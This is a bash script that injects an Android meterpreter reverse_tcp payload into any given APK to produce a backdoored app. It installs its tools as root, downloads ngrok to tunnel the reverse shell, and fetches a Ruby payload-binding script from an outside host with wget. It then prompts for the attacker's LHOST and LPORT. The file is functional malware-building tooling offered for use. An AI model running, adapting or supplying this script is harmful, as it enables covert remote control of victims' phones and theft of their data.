#!/bin/bash
# A script to bind android payload (android/meterpreter/reverse_tcp) to any given apk.

# Color Codes
black='\e[0;30m'        # Black
red='\e[1;31m'          # Red
green='\e[1;32m'        # Green
yellow='\e[1;33m'       # Yellow
blue='\e[1;34m'         # Blue
purple='\e[1;35m'       # Purple
cyan='\e[1;36m'         # Cyan
white='\e[0;37m'        # White
fuschia="\033[0;35m"    # Fuschia
nocol='\033[0m'         # Default

function line {
   echo -e "$fuschia---------------------------------------------------------------------------$nocol"
}

function disp_banner {
   echo -ne $cyan
   echo "    ___    ____  __ __             ____  _____  ____    ____  ___    ____  ";
   echo "   /   |  / __ \/ //_/            / __ \/   \ \/ / /   / __ \/   |  / __ \ ";
   echo "  / /| | / /_/ / ,<     ______   / /_/ / /| |\  / /   / / / / /| | / / / / ";
   echo " / ___ |/ ____/ /| |   /_____/  / ____/ ___ |/ / /___/ /_/ / ___ |/ /_/ /  ";
   echo "/_/  |_/_/   /_/ |_|           /_/   /_/  |_/_/_____/\____/_/  |_/_____/   ";
   echo -n "                                                                        ";
   echo -e $nocol
}

if [ `which resize | wc -l` -ne 0 ];then resize -s 30 75 2>/dev/null 1>/dev/null; fi
clear
line
disp_banner
line

# check for root
if [ $(echo $UID) -ne 0 ]; then echo -e "$red Run this Script as root !!"; echo -e $nocol; exit 1; fi

# setting up work directory
export work_dir="/tmp/apk-payload/$(date +%d%m%y_%H%M%S)"
export cur_dir="$PWD"
mkdir -p $work_dir

# check for xterm and install if not present
if [ `which xterm | wc -l` -eq 0 ];then
   echo -ne "$yellow -> Installing xterm\t\t[$nocol"
   apt-get install -y xterm 1>/dev/null 2>/dev/null
   if [ $(which xterm | wc -l) -eq 1 ];then
      echo -e "$green DONE$yellow ] $nocol"
   else echo -e "$red FAILED$yellow ] $nocol"; exit 1
   fi
fi

# installing ruby and nokogiri
if ! [ -e $HOME/.ruby_success ];then
	echo -ne "$yellow -> Installing ruby\t\t[$nocol"
	apt-get install -y build-essential patch ruby-dev zlib1g-dev liblzma-dev 1>/dev/null 2>/dev/null
	gem install nokogiri 1>/dev/null 2>/dev/null
	if [ $(which ruby | wc -l) -eq 1 ];then
		echo -e "$green DONE$yellow ] $nocol"
		touch $HOME/.ruby_success 2>/dev/null
	else echo -e "$red FAILED$yellow ] $nocol"; exit 1
	fi
fi

# check for apktool and install if not present
if [ `which apktool | wc -l` -eq 0 ];then
   echo -ne "$yellow -> Installing apktool\t\t[$nocol"
   apt-get install -y apktool 1>/dev/null 2>/dev/null
   if [ $(which apktool | wc -l) -eq 1 ];then
      echo -e "$green DONE$yellow ] $nocol"
   else echo -e "$red FAILED$yellow ] $nocol"; exit 1
   fi
fi

# check for jarsigner and install if not present
if [ $(which jarsigner | wc -l) -eq 0 ];then
   echo -ne "$yellow -> Installing jarsigner\t\t[$nocol"
   apt-get install -y openjdk-8-jdk-headless 1>/dev/null 2>/dev/null
   if [ $(which jarsigner | wc -l) -eq 1 ];then
      echo -e "$green DONE$yellow ] $nocol"
   else echo -e "$red FAILED$yellow ] $nocol"; exit 1
   fi
fi

# executing ngrok tcp 4444
function exec_ngrok {
   xterm -e ngrok tcp 4444 &
}

# fetching ngrok and placing it in /usr/bin
if ! [ -e /usr/bin/ngrok ];then
   echo -ne "$yellow -> Downloading ngrok\t\t[$nocol"
   wget -qO $work_dir/ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
   if [ `unzip -l $work_dir/ngrok.zip 1>/dev/null 2>/dev/null; echo $?` -eq 0 ];then
      echo -e "$green DONE$yellow ] $nocol"
      echo -ne "$yellow -> Placing ngrok at /usr/bin\t[$nocol"
      unzip -qq $work_dir/ngrok.zip -d /usr/bin/
      if [ $? -eq 0 ];then echo -e "$green DONE$yellow ] $nocol"; else echo -e "$red FAILED$yellow ] $nocol"; fi
   else rm $work_dir/ngrok.zip 2>/dev/null; echo -e "$red FAILED$yellow ] $nocol"; exit 1
   fi
else exec_ngrok
fi

# fetch apk-embed-payload.rb
if ! [ -e /root/apk-bind.rb ];then
	echo -ne "$yellow -> Fetching script\t\t[$nocol"
	wget -qO /root/apk-bind.rb http://vinayakwadhwa.in/apk-embed-payload.rb
	if [ -e /root/apk-bind.rb ];then
		echo -e "$green DONE$yellow ] $nocol"
	else echo -e "$red FAILED$yellow ] $nocol"; exit 1
	fi
else cp /root/apk-bind.rb $work_dir/apk-bind.rb 2>/dev/null
fi

# creating payload
echo -ne "$yellow -> Enter path of apk : $green"
# check for correct apk path
while read apk_path; do
    export apk_path=$(echo "$apk_path" | tr -d "'")
    if [ -e "$apk_path" ]; then	break;
    else echo -e "$red Wrong path entered !! Enter again !!$nocol"; echo -ne "$green"; fi
done
export apk_name=mod-$(basename "$apk_path")
cp "$apk_path" $work_dir/orig.apk 2>/dev/null
echo -ne $nocol
echo -en "$yellow -> Enter LHOST : $green"
read lhost
echo -ne $nocol
echo -en "$yellow -> Enter LPORT : $green"
read lport
echo -ne $nocol
export payload="android/meterpreter/reverse_tcp"
cd $work_dir
line
ruby apk-bind.rb orig.apk -p $payload $lhost $lport
line

# check for payload
export apk_out=$(find $work_dir -iname "*_backdoored.apk")
if [ -n $apk_out ];then
   echo -e "$yellow -> Your modified apk is at\n$green $apk_out $nocol"
   line
   echo -ne "$yellow -> Press Enter to move\n$green $apk_out\n$yellow to$cyan $cur_dir/$apk_name $nocol"
   read enterkey
   mv $apk_out $cur_dir/"$apk_name" 2>/dev/null
else echo -e "$red Unable to bind$green $apk_name $red!! $nocol"
fi
line
killme=$(pidof `which ngrok`)
if [ -n "$killme" ];then for p in "$killme";do kill -9 $p; done; fi
